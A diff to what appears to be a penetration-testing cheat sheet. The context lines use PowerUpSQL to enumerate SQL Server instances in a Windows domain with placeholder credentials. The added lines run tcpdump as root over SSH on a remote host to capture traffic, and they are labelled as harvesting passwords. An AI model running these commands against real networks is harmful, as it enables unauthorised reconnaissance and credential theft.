@@ -23,3 +23,7 @@ Get-SQLInstanceDomain -Verbose -Username 'Domain_name\User_Name' -Password 'Pass
 runas /noprofile /netonly /user:domain\user PowerShell.exe
 import-module PowerUpSQL.psd1
 Get-SQLInstanceDomain -Verbose -DomainController 192.168.1.1 -Username domain\user -password P@ssword123
+
+( remote tcpdump harvesting passwords )
+$ ssh root@<IP_Address> "/usr/sbin/tcpdump -i br0 -nn -U -s 1500 -w - not port 22" > pcap.1
+tcpdump: listening on br0, link-type EN10MB (Ethernet), capture size 1500 bytes
